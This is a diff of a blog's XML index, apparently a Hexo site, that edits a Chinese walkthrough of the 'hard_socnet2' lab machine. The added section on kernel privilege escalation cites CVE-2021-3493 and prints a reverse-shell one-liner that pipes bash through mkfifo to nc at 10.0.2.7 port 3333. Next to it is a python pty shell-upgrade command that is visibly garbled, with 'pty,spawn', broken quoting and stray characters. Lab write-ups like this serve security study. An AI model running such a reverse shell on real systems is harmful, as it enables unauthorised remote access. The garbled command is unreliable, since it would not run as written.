@@ -8,7 +8,7 @@
 ]]></content>
   </entry>
   <entry>
-    <title>hard_socnet2</title>
+    <title>Hard_socnet2</title>
     <url>/2022/11/12/hard-socnet2/</url>
     <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>
@@ -36,13 +36,13 @@
 
 
 
-<p><strong>0x05 后台图片上传 &amp; SQL注入</strong></p>
 <p>那就把八种请求方式全部试一遍。OPTIONS、HEAD、GET、POST、PUT、DELETE、TRACE、CONNECT。最终也只有POST请求返回信息有些许不同。</p>
 <img src="/2022/11/12/hard-socnet2/05.png" class title="This is an example image">
 
 
 
 <p>根据返回信息可以看到，提示 xml 解析报错，元素为空，猜测应该是服务端对外提供的 api，但具体调用格式还不清楚，先换个点，收集多点信息。</p>
+<p><strong>0x05 后台图片上传 &amp; SQL注入</strong></p>
 <p>访问默认 80 端口。有个 Pynch 系统，有个登录框和注册框，并且登录账号为邮箱。</p>
 <img src="/2022/11/12/hard-socnet2/06.png" class title="This is an example image">
 
@@ -223,6 +223,12 @@
 
 <p>执行 cat payload - | .&#x2F;add_record</p>
 <img src="/2022/11/12/hard-socnet2/33.png" class title="This is an example image">
+
+
+
+<p><strong>0x08 内核提权</strong></p>
+<p>其实这台主机可以直接用 CVE-2021-3493 提权到 root，但因为靶机发布在此漏洞之前，作者应该是没想到这种情况。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">命令执行反弹shell</span></span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.7 3333 &gt;/tmp/f</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过python优化交互的shell</span></span><br><span class="line">python -c &quot;import pty; pty,spawn(&#x27;/bin/bash) &lt;les$ python  -c &quot;import pty; pty,spawn(&#x27;/bin/bash)&quot;&#x27;)&quot;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
